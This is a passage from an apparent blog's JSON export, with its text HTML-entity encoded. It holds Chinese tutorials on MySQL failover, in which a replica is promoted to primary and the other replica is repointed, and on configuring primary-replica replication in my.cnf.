;&#x6570;&#x636E;&#x5E93;M&#x3002; &#x5F53;&#x4E3B;&#x670D;&#x52A1;&#x5668;M&#x56E0;&#x4E3A;&#x610F;&#x5916;&#x60C5;&#x51B5;&#x5B95;&#x673A;&#xFF0C;&#x9700;&#x8981;&#x5C06;&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x5047;&#x8BBE;&#x9009;&#x62E9;S1&#xFF09;&#x5207;&#x6362;&#x6210;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x540C;&#x65F6;&#x4FEE;&#x6539;&#x53E6;&#x4E00;&#x4E2A;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#xFF08;S2&#xFF09;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x4F7F;&#x5176;&#x6307;&#x5411;&#x65B0;&#x7684;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF08;S1&#xFF09;&#x3002; &#x6B64;&#x5916;&#x8FD8;&#x9700;&#x8981;&#x901A;&#x77E5;&#x5E94;&#x7528;&#x4FEE;&#x6539;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5982;&#x679C;&#x53EF;&#x80FD;&#xFF0C;&#x5C06;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x7684;&#x4E3B;&#x6570;&#x636E;&#x5E93;(M)&#x4FEE;&#x590D;&#x6216;&#x8005;&#x91CD;&#x7F6E;&#x6210;&#x65B0;&#x7684;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x3002;&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x8FD8;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x65B9;&#x6848;&#x6765;&#x5B9E;&#x73B0;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x6BD4;&#x5982;MHA&#xFF0C;MySQL Cluster&#xFF0C;MMM&#xFF0C;&#x8FD9;&#x4E9B;&#x6682;&#x4E0D;&#x8BA8;&#x8BBA;&#x3002; &#x64CD;&#x4F5C;&#x6B65;&#x9AA4;1&#x3001;&#x9996;&#x5148;&#x8981;&#x786E;&#x4FDD;&#x6240;&#x6709;&#x7684;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x90FD;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x4E86;relay log&#x4E2D;&#x7684;&#x5168;&#x90E8;&#x66F4;&#x65B0;&#xFF0C;&#x5728;&#x6BCF;&#x4E2A;&#x4ECE;&#x5E93;&#x4E0A;&#xFF0C;&#x6267;&#x884C;stop slave io_thread&#xFF0C;&#x505C;&#x6B62;IO&#x7EBF;&#x7A0B;&#xFF0C;&#x7136;&#x540E;&#x68C0;&#x67E5;show processlist&#x7684;&#x8F93;&#x51FA;&#xFF0C;&#x76F4;&#x5230;&#x770B;&#x5230;&#x72B6;&#x6001;&#x662F;Slave has read all relay log; waiting for the slave I/O thread to update it&#xFF0C;&#x8868;&#x793A;&#x66F4;&#x65B0;&#x90FD;&#x6267;&#x884C;&#x5B8C;&#x6BD5; S1(&#x4ECE;&#x5E93;1&#x64CD;&#x4F5C;)&#xFF1A;12345678910111213141516171819202122232425mysql&gt; stop slave io_thread;Query OK, 0 rows affected (0.06 sec)mysql&gt; show processlist\\G*************************** 1. row *************************** Id: 3 User: system user Host: db: NULLCommand: Connect Time: 2601 State: Slave has read all relay log; waiting for the slave I/O thread to update it Info: NULL*************************** 2. row *************************** Id: 4 User: root Host: localhost db: NULLCommand: Query Time: 0 State: NULL Info: show processlistrows in set (0.00 sec)mysql&gt;","keywords":null,"text":"&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x67B6;&#x6784;&#x5F88;&#x591A;&#x4E3A;&#x4E00;&#x4E3B;&#x591A;&#x4ECE;&#x3002;&#x6BD4;&#x5982;&#x4E00;&#x4E2A;&#x4E3B;&#x6570;&#x636E;&#x5E93;M&#xFF0C;&#x4E24;&#x4E2A;&#x4ECE;&#x6570;&#x636E;&#x5E93;S1&#xFF0C;S2&#x540C;&#x65F6;&#x6307;&#x5411;&#x4E3B;&#x6570;&#x636E;&#x5E93;M&#x3002; &#x5F53;&#x4E3B;&#x670D;&#x52A1;&#x5668;M&#x56E0;&#x4E3A;&#x610F;&#x5916;&#x60C5;&#x51B5;&#x5B95;&#x673A;&#xFF0C;&#x9700;&#x8981;&#x5C06;&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x5047;&#x8BBE;&#x9009;&#x62E9;S1&#xFF09;&#x5207;&#x6362;&#x6210;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x540C;&#x65F6;&#x4FEE;&#x6539;&#x53E6;&#x4E00;&#x4E2A;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#xFF08;S2&#xFF09;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x4F7F;&#x5176;&#x6307;&#x5411;&#x65B0;&#x7684;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF08;S1&#xFF09;&#x3002; &#x6B64;&#x5916;&#x8FD8;&#x9700;&#x8981;&#x901A;&#x77E5;&#x5E94;&#x7528;&#x4FEE;&#x6539;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5982;&#x679C;&#x53EF;&#x80FD;&#xFF0C;&#x5C06;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x7684;&#x4E3B;&#x6570;&#x636E;&#x5E93;(M)&#x4FEE;&#x590D;&#x6216;&#x8005;&#x91CD;&#x7F6E;&#x6210;&#x65B0;&#x7684;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x3002;&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x8FD8;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x65B9;&#x6848;&#x6765;&#x5B9E;&#x73B0;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x6BD4;&#x5982;MHA&#xFF0C;MySQL Cluster&#xFF0C;MMM&#xFF0C;&#x8FD9;&#x4E9B;&#x6682;&#x4E0D;&#x8BA8;&#x8BBA;&#x3002; &#x64CD;&#x4F5C;&#x6B65;&#x9AA4;1&#x3001;&#x9996;&#x5148;&#x8981;&#x786E;&#x4FDD;&#x6240;&#x6709;&#x7684;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x90FD;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x4E86;relay log&#x4E2D;&#x7684;&#x5168;&#x90E8;&#x66F4;&#x65B0;&#xFF0C;&#x5728;&#x6BCF;&#x4E2A;&#x4ECE;&#x5E93;&#x4E0A;&#xFF0C;&#x6267;&#x884C;stop slave io_thread&#xFF0C;&#x505C;&#x6B62;IO&#x7EBF;&#x7A0B;&#xFF0C;&#x7136;&#x540E;&#x68C0;&#x67E5;show processlist&#x7684;&#x8F93;&#x51FA;&#xFF0C;&#x76F4;&#x5230;&#x770B;&#x5230;&#x72B6;&#x6001;&#x662F;Slave has read all relay log; waiting for the slave I/O thread to update it&#xFF0C;&#x8868;&#x793A;&#x66F4;&#x65B0;&#x90FD;&#x6267;&#x884C;&#x5B8C;&#x6BD5; S1(&#x4ECE;&#x5E93;1&#x64CD;&#x4F5C;)&#xFF1A;12345678910111213141516171819202122232425mysql&gt; stop slave io_thread;Query OK, 0 rows affected (0.06 sec)mysql&gt; show processlist\\G*************************** 1. row *************************** Id: 3 User: system user Host: db: NULLCommand: Connect Time: 2601 State: Slave has read all relay log; waiting for the slave I/O thread to update it Info: NULL*************************** 2. row *************************** Id: 4 User: root Host: localhost db: NULLCommand: Query Time: 0 State: NULL Info: show processlistrows in set (0.00 sec)mysql&gt; S2(&#x4ECE;&#x5E93;2&#x64CD;&#x4F5C;)&#xFF1A;12345678910111213141516171819202122232425mysql&gt; stop slave io_thread; Query OK, 0 rows affected (0.00 sec)mysql&gt; show processlist\\G*************************** 1. row *************************** Id: 4 User: system user Host: db: NULLCommand: Connect Time: 2721 State: Slave has read all relay log; waiting for the slave I/O thread to update it Info: NULL*************************** 2. row *************************** Id: 5 User: root Host: localhost db: NULLCommand: Query Time: 0 State: NULL Info: show processlistrows in set (0.00 sec)mysql&gt; 2&#x3001;&#x5728;&#x4ECE;&#x5E93;S1&#x4E0A;&#xFF0C;&#x6267;&#x884C;stop slave&#x505C;&#x6B62;&#x4ECE;&#x670D;&#x52A1;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;reset master&#x4EE5;&#x91CD;&#x7F6E;&#x6210;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E76;&#x4E14;&#x8FDB;&#x884C;&#x6388;&#x6743;&#x8D26;&#x53F7;&#xFF0C;&#x8BA9;S2&#xFF08;&#x4ECE;&#x5E93;2&#xFF09;&#x6709;&#x6743;&#x9650;&#x8FDB;&#x884C;&#x8FDE;&#x63A5; S1&#xFF08;&#x4ECE;&#x5E93;1&#x64CD;&#x4F5C;&#xFF09;&#xFF1A; 12345678910mysql&gt; stop slave;Query OK, 0 rows affected (0.01 sec)mysql&gt; reset master;Query OK, 0 rows affected (0.06 sec)mysql&gt; grant replication slave on *.* to &apos;repl&apos;@&apos;192.168.0.100&apos; identified by &apos;123456&apos;;Query OK, 0 rows affected (0.00 sec)mysql&gt; 3&#x3001;&#x5728;S2&#xFF08;&#x4ECE;&#x5E93;2&#xFF09;&#x4E0A;&#xFF0C;&#x6267;&#x884C;stop slave&#x505C;&#x6B62;&#x4ECE;&#x670D;&#x52A1;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;change master to master_host=&#x2019;S1&#x2019;&#x4EE5;&#x91CD;&#x65B0;&#x8BBE;&#x7F6E;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x6267;&#x884C;start slave&#x542F;&#x52A8;&#x590D;&#x5236;&#xFF1A; S2&#xFF08;&#x4ECE;&#x5E93;2&#x64CD;&#x4F5C;&#xFF09;&#xFF1A; 12345678910mysql&gt; stop slave;Query OK, 0 rows affected (0.01 sec)mysql&gt; change master to master_host=&apos;192.168.0.20&apos;;Query OK, 0 rows affected (0.06 sec)mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; 4&#x3001;&#x67E5;&#x770B;S2&#xFF08;&#x4ECE;&#x5E93;2&#xFF09;&#x590D;&#x5236;&#x72B6;&#x6001;&#x662F;&#x5426;&#x6B63;&#x5E38;&#xFF1A; 123456789101112131415161718192021222324252627282930313233343536373839404142434445mysql&gt; show slave status\\G*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.0.20 Master_User: repl Master_Port: 3306 Connect_Retry: 2 Master_Log_File: mysql-bin.000001 Read_Master_Log_Pos: 261 Relay_Log_File: MySQL-02-relay-bin.000002 Relay_Log_Pos: 407 Relay_Master_Log_File: mysql-bin.000001 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: yayun.% Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 261 Relay_Log_Space: 566 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 2row in set (0.00 sec)mysql&gt; &#x67E5;&#x770B;&#x539F;&#x6765;&#x7684;&#x4ECE;&#x5E93;S1&#xFF0C;&#x73B0;&#x5728;&#x7684;&#x4E3B;&#x5E93;&#x7684;show processlist&#x60C5;&#x51B5;&#xFF1A;12345678910111213141516171819202122mysql&gt; show processlist\\G*************************** 1. row *************************** Id: 4 User: root Host: localhost db: NULLCommand: Query Time: 0 State: NULL Info: show processlist*************************** 2. row *************************** Id: 7 User: repl Host: 192.168.0.100:60235 db: NULLCommand: Binlog Dump Time: 184 State: Master has sent all binlog to slave; waiting for binlog to be updated Info: NULLrows in set (0.00 sec)mysql&gt; 5&#x3001;&#x901A;&#x77E5;&#x6240;&#x6709;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x5C06;&#x5E94;&#x7528;&#x6307;&#x5411;S1&#xFF08;&#x5DF2;&#x63D0;&#x5347;&#x4E3A;&#x4E3B;&#x5E93;&#xFF09;,&#x8FD9;&#x6837;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x7684;&#x6240;&#x6709;&#x7684;&#x66F4;&#x65B0;&#x53D8;&#x5316;&#x5C06;&#x8BB0;&#x5F55;&#x5230;S1&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x3002; 6&#x3001;&#x5220;&#x9664;S1&#xFF08;&#x65B0;&#x7684;&#x4E3B;&#x5E93;&#xFF09;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;master.info&#x548C;relay-log.info&#x6587;&#x4EF6;&#xFF0C;&#x5426;&#x5219;&#x4E0B;&#x6B21;&#x91CD;&#x542F;&#x65F6;&#x8FD8;&#x4F1A;&#x6309;&#x7167;&#x4ECE;&#x5E93;&#x542F;&#x52A8;&#x3002;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x8BE5;&#x53C2;&#x6570;&#xFF1A;1skip_slave_start 7&#x3001;&#x6700;&#x540E;&#xFF0C;&#x5982;&#x679C;M&#x670D;&#x52A1;&#x5668;&#x4FEE;&#x590D;&#x4EE5;&#x540E;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x6309;&#x7167;S2&#x7684;&#x65B9;&#x6CD5;&#x914D;&#x7F6E;&#x6210;S1&#x7684;&#x4ECE;&#x5E93;&#x3002; 8&#x3001;&#x4E0A;&#x9762;&#x7684;&#x6D4B;&#x8BD5;&#x6B65;&#x9AA4;&#x4E2D;S1&#x9ED8;&#x8BA4;&#x90FD;&#x662F;&#x6253;&#x5F00;log-bin&#x9009;&#x9879;&#x7684;&#xFF0C;&#x8FD9;&#x6837;&#x91CD;&#x7F6E;&#x6210;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x540E;&#x53EF;&#x4EE5;&#x5C06;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x4E0B;&#x6765;&#xFF0C;&#x5E76;&#x4F20;&#x9001;&#x5230;&#x5176;&#x4ED6;&#x4ECE;&#x5E93;&#xFF0C;&#x8FD9;&#x662F;&#x63D0;&#x5347;&#x4E3A;&#x4E3B;&#x5E93;&#x5FC5;&#x987B;&#x7684;&#x3002;&#x5176;&#x6B21;&#xFF0C;S1&#x6CA1;&#x6709;&#x6253;&#x5F00;log-slave-updates&#x53C2;&#x6570;&#xFF0C;&#x5426;&#x5219;&#x91CD;&#x7F6E;&#x6210;&#x4E3B;&#x5E93;&#x4EE5;&#x540E;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x5C06;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x8FC7;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x91CD;&#x590D;&#x4F20;&#x9001;&#x7ED9;S2&#xFF0C;&#x5BFC;&#x81F4;S2&#x540C;&#x6B65;&#x9519;&#x8BEF;&#x3002; &#x76F8;&#x5173;&#x94FE;&#x63A5;&#x4E3B;&#x4ECE;&#x5207;&#x6362;&#x811A;&#x672C;&#x53C2;&#x8003;&#x94FE;&#x63A5;&#xFF1A;http://blog.itpub.net/25356953/viewspace-1745534/","raw":null,"content":null,"categories":[{"name":"数据库","slug":"数据库","permalink":"http://www.wangxin123.com/categories/数据库/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.wangxin123.com/tags/mysql/"}]},{"title":"MySQL主从搭建","slug":"MySQL主从搭建","date":"2016-10-07T14:22:00.000Z","updated":"2017-02-09T06:28:49.976Z","comments":true,"path":"2016/10/07/MySQL主从搭建/","link":"","permalink":"http://www.wangxin123.com/2016/10/07/MySQL主从搭建/","excerpt":"&#x4E3B;&#x670D;&#x52A1;&#x5668;: 192.168.1.100&#x4ECE;&#x670D;&#x52A1;&#x5668;: 192.168.1.101 &#x4E3B;&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;1&#x3001;&#x7F16;&#x8F91;&#x914D;&#x7F6E;&#x6587;&#x4EF6; 1234567891011121314151617181920212223242526272829303132333435# &#x5982;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x5C31;&#x624B;&#x52A8;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;vim /etc/my.cnf&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x52A0;&#x5165;&#x5982;&#x4E0B;&#x503C;&#xFF1A;[mysqld] # &#x552F;&#x4E00;&#x7684;&#x670D;&#x52A1;&#x8FA8;&#x8BC6;&#x53F7;,&#x6570;&#x503C;&#x4F4D;&#x4E8E; 1 &#x5230; 2^32-1&#x4E4B;&#x95F4;.# &#x6B64;&#x503C;&#x5728;master&#x548C;slave&#x4E0A;&#x90FD;&#x9700;&#x8981;&#x8BBE;&#x7F6E;.# &#x5982;&#x679C; &#x201C;master-host&#x201D; &#x6CA1;&#x6709;&#x88AB;&#x8BBE;&#x7F6E;,&#x5219;&#x9ED8;&#x8BA4;&#x4E3A;1, &#x4F46;&#x662F;&#x5982;&#x679C;&#x5FFD;&#x7565;&#x6B64;&#x9009;&#x9879;,MySQL&#x4E0D;&#x4F1A;&#x4F5C;&#x4E3A;master&#x751F;&#x6548;.server-id=1# &#x6253;&#x5F00;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x529F;&#x80FD;.# &#x5728;&#x590D;&#x5236;(replication)&#x914D;&#x7F6E;&#x4E2D;,&#x4F5C;&#x4E3A; MASTER &#x4E3B;&#x670D;&#x52A1;&#x5668;&#x5FC5;&#x987B;&#x6253;&#x5F00;&#x6B64;&#x9879;# &#x5982;&#x679C;&#x4F60;&#x9700;&#x8981;&#x4ECE;&#x4F60;&#x6700;&#x540E;&#x7684;&#x5907;&#x4EFD;&#x4E2D;&#x505A;&#x57FA;&#x4E8E;&#x65F6;&#x95F4;&#x70B9;&#x7684;&#x6062;&#x590D;,&#x4F60;&#x4E5F;&#x540C;&#x6837;&#x9700;&#x8981;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;. log-bin=master-binlog-bin-index=master-bin.index# &#x4EE5;&#x4E0B;&#x4E3A;&#x975E;&#x5FC5;&#x987B;&#x8BBE;&#x7F6E;&#x7684;&#x9009;&#x9879;# &#x8868;&#x660E;&#x8DDD;&#x79BB;&#x5F53;&#x524D;&#x65F6;&#x95F4;&#x6B63;&#x597D;n&#x5929;&#x524D;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x4F1A;&#x88AB;&#x7CFB;&#x7EDF;&#x81EA;&#x52A8;&#x5220;&#x9664;# &#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x5343;&#x4E07;&#x4E0D;&#x8981;&#x624B;&#x52A8;&#x5220;&#x9664;expire-logs-days=14# binlog&#x6709;&#x4E09;&#x79CD;&#x65E5;&#x5FD7;&#x683C;&#x5F0F;, Statement&#x3001;Row&#x3001;Mixed, mysql&#x9ED8;&#x8BA4;&#x91C7;&#x7528;statement, &#x5EFA;&#x8BAE;&#x4F7F;&#x7528;mixedbinlog_format=mixed# sync_binlog=0&#xFF0C;&#x5F53;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x4E4B;&#x540E;&#xFF0C;MySQL&#x4E0D;&#x505A;fsync&#x4E4B;&#x7C7B;&#x7684;&#x78C1;&#x76D8;&#x540C;&#x6B65;&#x6307;&#x4EE4;&#x5237;&#x65B0;binlog_cache&#x4E2D;&#x7684;&#x4FE1;&#x606F;&#x5230;&#x78C1;&#x76D8;&#xFF0C;&#x800C;&#x8BA9;Filesystem&#x81EA;&#x884C;&#x51B3;&#x5B9A;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x6765;&#x505A;&#x540C;&#x6B65;&#xFF0C;&#x6216;&#x8005;cache&#x6EE1;&#x4E86;&#x4E4B;&#x540E;&#x624D;&#x540C;&#x6B65;&#x5230;&#x78C1;&#x76D8;&#x3002;# sync_binlog=n&#xFF0C;&#x5F53;&#x6BCF;&#x8FDB;&#x884C;n&#x6B21;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x4E4B;&#x540E;&#xFF0C;MySQL&#x5C06;&#x8FDB;&#x884C;&#x4E00;&#x6B21;fsync&#x4E4B;&#x7C7B;&#x7684;&#x78C1;&#x76D8;&#x540C;&#x6B65;&#x6307;&#x4EE4;&#x6765;&#x5C06;binlog_cache&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5F3A;&#x5236;&#x5199;&#x5165;&#x78C1;&#x76D8;# &#x8BBE;&#x7F6E;&#x4E3A;0&#x548C;&#x8BBE;&#x7F6E;&#x4E3A;1&#x7684;&#x7CFB;&#x7EDF;&#x5199;&#x5165;&#x6027;&#x80FD;&#x5DEE;&#x8DDD;&#x6709;&#x65F6;&#x5019;&#x9AD8;&#x8FBE;5&#x500D;&#x751A;&#x81F3;&#x66F4;&#x591A;&#x3002;sync-binlog=1# &#x5355;&#x4E2A;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x6700;&#x5927;&#x5B57;&#x8282;&#x8BBE;&#x7F6E;&#x6700;&#x5927;100MB&#xFF08;&#x5355;&#x4F4D;&#xFF1A;&#x5B57;&#x8282;&#xFF09; # &#x65E5;&#x5FD7;&#x9ED8;&#x8BA4;&#x503C;&#x662F;1GB&#xFF0C;&#x7531;&#x4E8E;&#x4E8B;&#x52A1;&#xFF0C;&#x4E00;&#x822C;&#x6587;&#x4EF6;&#x90FD;&#x5927;&#x4E8E;1GBmax_binlog_size=104857600 #&#x9700;&#x8981;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#x5E93; binlog-do-db=orders#&#x4E0D;&#x9700;&#x8981;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#x5E93;#&#x82E5;&#x6CA1;&#x6709;&#x914D;&#x7F6E;binlog-do-db&#x548C;binlog_ignore_db&#xFF0C;&#x8868;&#x793A;&#x5907;&#x4EFD;&#x5168;&#x90E8;&#x6570;&#x636E;&#x5E93;&#x3002;binlog-ignore-db=mysql","keywords":null,"text":"&#x4E3B;&#x670D;&#x52A1;&#x5668;: 192.168.1.100&#x4ECE;&#x670D;&#x52A1;&#x5668;: 192.168.1.101 &#x4E3B;&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;1&#x3001;&#x7F16;&#x8F91;&#x914D;&#x7F6E;&#x6587;&#x4EF6; 1234567891011121314151617181920212223242526272829303132333435# &#x5982;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x5C31;&#x624B;&#x52A8;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;vim /etc/my.cnf&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x52A0;&#x5165;&#x5982;&#x4E0B;&#x503C;&#xFF1A;[mysqld] # &#x552F;&#x4E00;&#x7684;&#x670D;&#x52A1;&#x8FA8;&#x8BC6;&#x53F7;,&#x6570;&#x503C;&#x4F4D;&#x4E8E; 1 &#x5230; 2^32-1&#x4E4B;&#x95F4;.# &#x6B64;&#x503C;&#x5728;master&#x548C;slave&#x4E0A;&#x90FD;&#x9700;&#x8981;&#x8BBE;&#x7F6E;.# &#x5982;&#x679C; &#x201C;master-host&#x201D; &#x6CA1;&#x6709;&#x88AB;&#x8BBE;&#x7F6E;,&#x5219;&#x9ED8;&#x8BA4;&#x4E3A;1, &#x4F46;&#x662F;&#x5982;&#x679C;&#x5FFD;&#x7565;&#x6B64;&#x9009;&#x9879;,MySQL&#x4E0D;&#x4F1A;&#x4F5C;&#x4E3A;master&#x751F;&#x6548;.server-id=1# &#x6253;&#x5F00;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x529F;&#x80FD;.# &#x5728;&#x590D;&#x5236;(replication)&#x914D;&#x7F6E;&#x4E2D;,&#x4F5C;&#x4E3A; MASTER &#x4E3B;&#x670D;&#x52A1;&#x5668;&#x5FC5;&#x987B;&#x6253;&#x5F00;&#x6B64;&#x9879;# &#x5982;&#x679C;&#x4F60;&#x9700;&#x8981;&#x4ECE;&#x4F60;&#x6700;&#x540E;&#x7684;&#x5907;&#x4EFD;&#x4E2D;&#x505A;&#x57FA;&#x4E8E;&#x65F6;&#x95F4;&#x70B9;&#x7684;&#x6062;&#x590D;,&#x4F60;&#x4E5F;&#x540C;&#x6837;&#x9700;&#x8981;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;. log-bin=master-binlog-bin-index=master-bin.index# &#x4EE5;&#x4E0B;&#x4E3A;&#x975E;&#x5FC5;&#x987B;&#x8BBE;&#x7F6E;&#x7684;&#x9009;&#x9879;# &#x8868;&#x660E;&#x8DDD;&#x79BB;&#x5F53;&#x524D;&#x65F6;&#x95F4;&#x6B63;&#x597D;n&#x5929;&#x524D;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x4F1A;&#x88AB;&#x7CFB;&#x7EDF;&#x81EA;&#x52A8;&#x5220;&#x9664;# &#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x5343;&#x4E07;&#x4E0D;&#x8981;&#x624B;&#x52A8;&#x5220;&#x9664;expire-logs-days=14# binlog&#x6709;&#x4E09;&#x79CD;&#x65E5;&#x5FD7;&#x683C;&#x5F0F;, Statement&#x3001;Row&#x3001;Mixed, mysql&#x9ED8;&#x8BA4;&#x91C7;&#x7528;statement, &#x5EFA;&#x8BAE;&#x4F7F;&#x7528;mixedbinlog_format=mixed# sync_binlog=0&#xFF0C;&#x5F53;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x4E4B;&#x540E;&#xFF0C;MySQL&#x4E0D;&#x505A;fsync&#x4E4B;&#x7C7B;&#x7684;&#x78C1;&#x76D8;&#x540C;&#x6B65;&#x6307;&#x4EE4;&#x5237;&#x65B0;binlog_cache&#x4E2D;&#x7684;&#x4FE1;&#x606F;&#x5230;&#x78C1;&#x76D8;&#xFF0C;&#x800C;&#x8BA9;Filesystem&#x81EA;&#x884C;&#x51B3;&#x5B9A;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x6765;&#x505A;&#x540C;&#x6B65;&#xFF0C;&#x6216;&#x8005;cache&#x6EE1;&#x4E86;&#x4E4B;&#x540E;&#x624D;&#x540C;&#x6B65;&#x5230;&#x78C1;&#x76D8;&#x3002;# sync_binlog=n&#xFF0C;&#x5F53;&#x6BCF;&#x8FDB;&#x884C;n&#x6B21;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x4E4B;&#x540E;&#xFF0C;MySQL&#x5C06;&#x8FDB;&#x884C;&#x4E00;&#x6B21;fsync&#x4E4B;&#x7C7B;&#x7684;&#x78C1;&#x76D8;&#x540C;&#x6B65;&#x6307;&#x4EE4;&#x6765;&#x5C06;binlog_cache&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5F3A;&#x5236;&#x5199;&#x5165;&#x78C1;&#x76D8;# &#x8BBE;&#x7F6E;&#x4E3A;0&#x548C;&#x8BBE;&#x7F6E;&#x4E3A;1&#x7684;&#x7CFB;&#x7EDF;&#x5199;&#x5165;&#x6027;&#x80FD;&#x5DEE;&#x8DDD;&#x6709;&#x65F6;&#x5019;&#x9AD8;&#x8FBE;5&#x500D;&#x751A;&#x81F3;&#x66F4;&#x591A;&#x3002;sync-binlog=1# &#x5355;&#x4E2A;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x6700;&#x5927;&#x5B57;&#x8282;&#x8BBE;&#x7F6E;&#x6700;&#x5927;100MB&#xFF08;&#x5355;&#x4F4D;&#xFF1A;&#x5B57;&#x8282;&#xFF09; # &#x65E5;&#x5FD7;&#x9ED8;&#x8BA4;&#x503C;&#x662F;1GB&#xFF0C;&#x7531;&#x4E8E;&#x4E8B;&#x52A1;&#xFF0C;&#x4E00;&#x822C;&#x6587;&#x4EF6;&#x90FD;&#x5927;&#x4E8E;1GBmax_binlog_size=104857600 #&#x9700;&#x8981;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#x5E93; binlog-do-db=orders#&#x4E0D;&#x9700;&#x8981;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#x5E93;#&#x82E5;&#x6CA1;&#x6709;&#x914D;&#x7F6E;binlog-do-db&#x548C;binlog_ignore_db&#xFF0C;&#x8868;&#x793A;&#x5907;&#x4EFD;&#x5168;&#x90E8;&#x6570;&#x636E;&#x5E93;&#x3002;binlog-ignore-db=mysql 2&#x3001;&#x91CD;&#x542F;mysqld&#x670D;&#x52A1;1service mysqld restart 3&#x3001;&#x4E3A;&#x4ECE;MySQL&#x521B;&#x5EFA;&#x7528;&#x6237;123456789#&#x767B;&#x5F55;mysql -uroot -pEnter password: 